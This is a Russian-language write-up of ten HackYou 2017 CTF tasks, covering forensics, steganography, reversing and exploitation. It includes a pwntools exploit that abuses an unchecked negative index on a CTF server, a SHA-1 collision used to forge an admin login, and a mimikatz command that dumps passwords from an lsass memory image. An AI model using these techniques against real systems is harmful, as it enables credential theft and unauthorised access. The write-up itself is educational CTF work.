# HackYou 2017 Writeups

* [Web 10 - Palevo](#web-10---palevo)
* [CTB 10 - ProtSSH](#ctb-10---protssh)
* [csiM 10 - Lonely](#csim-10---lonely)
* [Forensic 300 - Three Point Five Inches Reborn](#forensic-300---three-point-five-inches-reborn)
* [CTB 200 — IDK](#ctb-200---idk)
* [Network 200 — Hugerar](#network-200---hugerar)
* [Reverse 100 — Door to Hacking](#reverse-100---door-to-hacking)
* [Misc 300 — Brainbank](#misc-300---brainbank)
* [Forensic 200 — EvilHacker](#forensic-200---evilhacker)
* [Bonus: Network 100 - Telegram](#bonus-network-100---telegram)

### Web 10 - Palevo
На сайте видим мини-блог. Для начала решаем просканировать на предмет файлов и папок:
```
$ dirsearch.py -e php,bak,sql,txt,log -u https://hy17-palevo.spb.ctf.su/
```
В результатах сразу видим доступность Apache Server Status по адресу https://hy17-palevo.spb.ctf.su/server-status/  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/1-1.png)  
В списке всех запросов на сайт видим один выделяющийся:  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/1-2.png)  
Переходим по данному адресу и видим единственный файл с названием `flag.txt`, из которого и получаем флаг.

### CTB 10 - ProtSSH
Так как креды для подключения у нас уже есть пробуем подключиться, однако сразу же попадаем на приглашение ввести какой-то `SECOND FACTOR AUTH`. Так как о нем мы ничего не знаем, пробуем угадать. На одной из таких попыток случайно нажимаем комбинацию клавиш `CTRL+C` и оказываем в консоли сервера. Вот такой получился необычный байпас второго фактора :). Исследовав файлы на хосте, находим упоминание о флаге в файле `.viminfo`:  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/2-1.png)  
Из этого файла и получаем флаг.

### csiM 10 - Lonely
В этом таске обращаем внимание на написание названия таска. Первые буквы (курсивные) составляют аббревиатуру LSB (least significant bit), что намекает на стеганографию и конкретный метод. Поэтому открываем данную картинку в Stegsolve. Пощелкав разные планы видим, что в альфа-канале присутствует qr-код.  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/3-1.png)  
Сканируем его и получаем флаг.

### Forensic 300 - Three Point Five Inches Reborn
В этом таске нам предлагают восстановить изображение с образа 3.5" дискеты. Пробуем открыть в `testdisk` - программа ничего не находит. Прогоняем по образу `binwalk` - он находит 2 jpeg-изображение, но они не полные.  
Пробуем открыть образ в каком-нибудь редакторе, который понимает файловую систему FAT12:  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/4-1.png)  
Вот и изображения. Первый символ в имени говорит о том, что они удалены, а вот остальная информация, такая как время и дата создания и модификации, атрибуты и, наиболее важная нам, адрес первого блока в FAT. Однако этот адрес мы может получить из смещений, найденных нами двух изображений.  
Для этого из образа получаем информацию о количестве секторов, треков и дорожек, а также размере сектора. Из всего этого выходит, что первый файл начинается в 34 секторе, а второй в 209 секторе. Однако в FAT указаны не физические адреса секторов, в логические. Для перевода из физического адреса в логический нужно отнять от адреса 33 и прибавить 2. Получаем 3 и 178 соответственно. Пробуем посмотреть в FAT информацию о цепочке секторов файлов, не забывая, что адреса в FAT хранятся в 12-битных значениях и смежны в двух соседних ячейках. Однако там нужные нам данные тоже забиты нулями.  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/4-2.png)  
Пробуем предположить, что все нужные нам сектора в FAT забиты нулями, и пробуем достать картинку, обходя все эти сектора, и минуя не, адреса которых есть в FAT. Получается. Однако не очень. Быстро обнаруживается пересечение двух изображений. Пробуем вытаскивать изображения, попеременно вытаскивая то один, то другой файл и в итоге получаем следующий скрипт, который и восстанавливает оба изображения.
```python
#!/usr/bin/env python2

first = 0x3
second = 0xB2

def skip(fat, pos, count):
    i = pos
    j = 0
    while j < count:
        val = 0
        if i % 2 == 0:
            val = (ord(fat[(1 + (3 * i) / 2)]) & 0xF) * 0x100 + ord(fat[(3 * i) / 2])
        else:
            val = (ord(fat[((3 * i) / 2 )]) >> 4) + ord(fat[1 + (3 * i) / 2]) * 0x10
        if val != 0:
            i += 1
            continue
        else:
            i += 1
            j += 1
    return i


def main():
    orig = open('three_point_five_inches_reborn.img', 'rb').read()
    clusters = []
    for i in xrange(0, len(orig), 512):
        clusters.append(orig[i:i+512])

    fat = list(''.join([clusters[i] for i in xrange(1,10)]))

    data = ''
    i = first
    filelen = 0
    while not b'\xff\xd9\x00\x00' in data:
        val = 0
        if i % 2 == 0:
            val = (ord(fat[(1 + (3 * i) / 2)]) & 0xF) * 0x100 + ord(fat[(3 * i) / 2])
        else:
            val = (ord(fat[((3 * i) / 2 )]) >> 4) + ord(fat[1 + (3 * i) / 2]) * 0x10
        if val != 0:
            i += 1
            continue

        if filelen == 91:
            i = skip(fat, i, 70)
        elif filelen == 153:
            i = skip(fat, i, 53)
        elif filelen == 250:
            i = skip(fat, i, 35)
        elif filelen == 311:
            i = skip(fat, i, 50)
        elif filelen == 340:
            i = skip(fat, i, 66)
        elif filelen == 353:
            i = skip(fat, i, 105)
        elif filelen == 387:
            i = skip(fat, i, 32)
        elif filelen == 410:
            i = skip(fat, i, 13)
        elif filelen == 446:
            i = skip(fat, i, 90)
        elif filelen == 573:
            i = skip(fat, i, 30)

        data += clusters[i + 31]
        filelen += 1
        i += 1

    open('left.jpg', 'wb').write(data)

    orig = open('three_point_five_inches_reborn.img', 'rb').read()
    clusters = []
    for i in xrange(0, len(orig), 512):
        clusters.append(orig[i:i+512])

    fat = list(''.join([clusters[i] for i in xrange(1,10)]))

    data = ''
    i = second
    filelen = 0
    while not b'\xff\xd9\x00\x00' in data:
        val = 0
        if i % 2 == 0:
            val = (ord(fat[(1 + (3 * i) / 2)]) & 0xF) * 0x100 + ord(fat[(3 * i) / 2])
        else:
            val = (ord(fat[((3 * i) / 2 )]) >> 4) + ord(fat[1 + (3 * i) / 2]) * 0x10
        if val != 0:
            i += 1
            continue

        if filelen == 70:
            i = skip(fat, i, 62)
        elif filelen == 123:
            i = skip(fat, i, 97)
        elif filelen == 158:
            i = skip(fat, i, 61)
        elif filelen == 208:
            i = skip(fat, i, 29)
        elif filelen == 274:
            i = skip(fat, i, 13)
        elif filelen == 379:
            i = skip(fat, i, 34)
        elif filelen == 411:
            i = skip(fat, i, 23)
        elif filelen == 424:
            i = skip(fat, i, 36)
        elif filelen == 514:
            i = skip(fat, i, 127)
        elif filelen == 544:
            i = skip(fat, i, 24)

        data += clusters[i + 31]
        filelen += 1
        i += 1

    open('right.jpg', 'wb').write(data)

if __name__ == '__main__':
    main()
```

### CTB 200 — IDK
Открываем файл в дизассемблере и анализируем. Получаем следующее - при вводе любой несуществующей команды проверяется соответствие имени пользователя с названием компилятора.  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/5-1.png)  
Это `clang_v1.4.5`. Далее, если эти строки совпадают, проверяются права пользователя и, если они не нулевые, выдается текст флага из файла. Подумаем, можем ли мы как-то повлиять на права пользователя? Да. Для этого нужно обратить внимание на то, как хранится информация в приложении. При вводе пользователем команды `place` программа запрашивает адрес ячейки для сохранения данных пользователя, умножает этот адрес на 8 и прибавляет к адресу массива ячеек (который программа нам любезно предоставляет сама в виде адреса хранилища). Далее проверяется, что значение полученной ячейке равно 0 и после этого выделяется массив из 256 байт и его адрес заносится в ячейку.  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/5-2.png)  
Однако нет никакой проверки введеного адреса ячейки и ничто не мешает нам указать отрицательный адрес, чтобы попасть на блок памяти со структурой текущего пользователя, адрес которого мы можем узнать по команде debug. А в этой структуре первое значение и есть права пользователя. Таким образом, алгоритм решения следующий: 
- получаем адрес структуры пользователя;
- высчитываем значение нужно ячейки;
- используем команду `place` пробы разместить в этой ячейке наши данные;
- с помощью любой несуществующей команды получаем флаг.  

Эти действия и выполняет следующий скрипт (а для верности еще и получает нужное имя пользователя с сервера):
```python
#!/usr/bin/env python2

from pwn import *

#context.log_level = 'debug'

def main():
    r = remote('109.233.56.90', 11055)
    r.recvuntil(':')
    r.sendline('asdasd')
    r.recvuntil('>')
    r.sendline('debug')
    data = r.recvuntil('>').split('\r\n')
    storageaddr = int(data[0].split(' ')[1], 16)
    useraddr = int(data[1].split(' ')[2], 16)
    r.sendline('get')
    r.recvuntil(':')
    r.sendline('-%d' % ((storageaddr - 0x6020a0) / 8))
    validname = r.recvuntil('>').split('\r\n')[0].strip()
    r.close()

    r = remote('109.233.56.90', 11055)
    r.recvuntil(':')
    r.sendline(validname)
    r.recvuntil('>')
    r.sendline('debug')
    data = r.recvuntil('>').split('\r\n')
    storageaddr = int(data[0].split(' ')[1], 16)
    useraddr = int(data[1].split(' ')[2], 16)
    r.sendline('place')
    r.recvuntil(':')
    r.sendline('-%d' % ((storageaddr - useraddr) / 8))
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil('>')
    r.sendline('debug')
    r.recvuntil('>')    
    r.sendline('flag')
    print 'Flag:', r.recvline()
    r.close()

if __name__ == '__main__':
    main()
```

### Network 200 — Hugerar
В этом таске нам нужно получить флаг из архива в 10Гб, однако полностью мы его скачать не можем, так как скорость скачивания ограничена 1Кб/с. Попробуем обойти нужное ограничение.  
Прежде всего обращаем внимание на хидер `Accept-Ranges: bytes` в ответе сервера. Это означает, что мы можем обратиться к любому фрагменту файла, указав смещение начала и конце фрагмента. Далее обращаем внимание на то, что в архиве каждый файл упакован в отдельный блок. Таким образом, мы можем просто перечислить все файлы в этом архиве, обращаясь по нужным смещениям внутри каждого блока. Первый блок находится по смещению 0x14, а размер блока - сумма полей headersize и rawdatasize.
Пишем скрипт который перечислит все файлы в архиве:
```python
#!/usr/bin/env python2

import requests
import struct

def ParseBlock(data):
    headersize = struct.unpack('<H', data[5:7])[0]
    rawdatasize = struct.unpack('<I', data[7:11])[0]
    namesize = struct.unpack('<H', data[26:28])[0]
    name = data[32:32+namesize]
    return headersize, rawdatasize, namesize, name

url = 'https://hy17-hugerar.spb.ctf.su/network200.rar'
offset = 0x14
while True:
    try:
        headers = {"Range": "bytes=%d-%d" % (offset, offset + 100)}
        r = requests.get(url, headers = headers)
        headersize, rawdatasize, namesize, name = ParseBlock(r.content)
        print name, offset, headersize + rawdatasize
        offset += headersize + rawdatasize
    except:
        break
```
В списке несколько файлов с названием flag, однако сразу же можно предположить, что нужный нам - `real_flag.txt`.  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/6-1.png)  
Из результатов работы скрипта мы получили смещение нужного блока и его размер. Теперь можем получить блок с этим файлом, склеить его с хидером архива и получить флаг.

### Reverse 100 — Door to Hacking
Открываем файл в декомпиляторе  `JD-GUI`. Видим, что конструируется строка, потом над ней выполняются некоторые действия и результат сравнивается с параметром, переданным программе при запуске. Чтобы долго не возиться просто перекомпилируем пример и вставим вывод строки перед сравнением. Запускаем с любым параметром и получаем правильную строку, которую и сдаем как флаг.

### Misc 300 — Brainbank
В данном таске видим сайт с регистрацией и логином. Смотрим исходники, которые доступны из описания таска. Из файла `auth.php` видим, что при авторизации выполняется отсылаемый файл с кодом на brainfuck. Результат этой программы используется как имя пользователя. Далее происходит проверка сигнатуры, отправленной при авторизации с хэшем hmac-sha256(sha1(код brainfuck), ключ). Ключ нам неизвестен. Потом проверяется имя пользователя и если оно содержит слово `admin`, то происходит вывод флага. При регистрации (файл `reg.php`) имя пользователя получается из результата работы программы на brainfuck, и выводится сигнатура для кода, который и выводит это имя пользователя. Однако там же происходит проверка, что в имени отсутствует слово `admin`. Немного подумав, вспоминаем про уязвимость sha1 к коллизиям [SHAttered](https://shattered.io). Ее суть в том, что уже есть 2 блока, разные по контенту, но одинаковые по сумме sha1. Таким образом, наша задача сконструировать такую программу brainfuck, который будет использовать какое-то отличие этих блоков для того, чтобы выводить разные имена пользователей. В результате получаем 2 файла:
```brainfuck
БЛОК1 >++<]>--[----->+<]>-----.+++.+++++++++.----.+++++.
```
Этот файл использует то, что тексте блока содержится начало цикла, таким образом мы изменяем значение ячейки памяти до начала основной программы. Итоговое имя пользователя - ничего не значащие символы.
```brainfuck
БЛОК2 >++<]>--[----->+<]>-----.+++.+++++++++.----.+++++.
```
Итоговое имя пользователя - admin.  
Таким образом мы получаем 2 файла, разные по контенту, но одинаковые по хэшу sha1:  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/8-1.png)  
Загружаем первый файл в регистрацию и получаем сигнатуру. Загружаем второй файл с сигнатурой первого в авторизацию и получаем флаг.

### Forensic 200 — EvilHacker
В этом таске нам дают образ памяти и указание на присутствие хакера на подопытной машине во время снятия дампа.  
Для работы с образом используем `volatility`. Для начала получим список процессов:
```
vol.py -f 20171009.mem --profile=Win7SP1x86 pslist
```
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/9-1.png)  
Самым интересным тут является `7zG.exe`. Посмотрим что именно открыто в 7z:
```
vol.py -f 20171009.mem --profile=Win7SP1x86 handles -p 3832 -t File
```
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/9-2.png)  
А вот и нужный нам файл. Сохраним его:
```
vol.py -f 20171009.mem --profile=Win7SP1x86 dumpfiles -p 3832 --name -i -u  -r flag.txt.7z -D tmp/
```
Файл сохранился, но распаковать мы его не можем, так как нужен пароль от архива. Долгие поиски показали, что у пользователя hacker установлен не стандартный пароль, а поиски по хэшу ничего не дали. Попробуем вытащить пароль из памяти. Для этого сохраним дам процесса `lsass.exe`:
```
vol.py -f 20171009.mem --profile=Win7SP1x86 memdump -p 492 -D tmp/
```
Попробуем достать пароль из этого дампа с помощью mimikatz:
```
mimikatz.exe "sekurlsa::minidump 492.dmp" "sekurlsa::logonpasswords" exit
```
Получилось! Пробуем этот пароль к архиву - опять попали! Сдаем флаг из распакованного файла.

### Bonus: Network 100 - Telegram
Открываем файл в `wireshark` и пробуем разобраться что к чем. Для начала видим несколько SSL пакетов на 443 порт - они нам бесполезны. После этого начинается UDP трафик. Проверяем ip-адреса хостов - все, которые начинаются с 91 принадлежат TG. Внутренний хост один - 192.168.31.22, будем анализировать трафик, исходящий от него.
В задании говорится, что первую минуту было радиомолчание, а потом была передача флага. Попробуем найти, что же поменялось. Находим, что после первой минуты периодически происходит увеличение размера пакетов.  
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/10-1.png)
Пробуем выбрать эти пакеты и замечаем, что блоки с увеличенным размером бывают только двух типов. Это, в сочетании со словом "радиомолчание", наталкивает на мысль об использовании морзянки для передачи флага. Пробуем написать скрипт, который будет выбирать эти блоки, и, в зависимости от длины, переводить из в точку или тире:
```python
#!/usr/bin/env python2

from scapy.all import *

def main():
    packets = rdpcap('telegram.pcapng')

    s = ''

    counter = 0
    for packet in packets:
        if packet['IP'].src == '192.168.31.22':
            if packet.haslayer('UDP'):
                if packet['UDP'].sport == 18942:
                    if packet.len > 290 - 14:
                        s += str(packet.len)
                    if packet.len == 130 - 14:
                        continue
                    if packet.len < 290 - 14:
                        s += ' '

    res = ''
    for c in filter(None, s.split(' ' * 40)):
        for l in c.split(' '):
            if len(l) == 0: continue
            if len(l.strip()) > 100:
                res += '-'
            else:
                res += '.'
        res += ' '

    print res

if __name__ == '__main__':
    main()
```
![IMG](https://github.com/rrockru/writeups/raw/master/2017/HackYou/images/10-2.png)  
Остается только перевести эту строку из азбуки Морзе в обычный текст.

### Конец!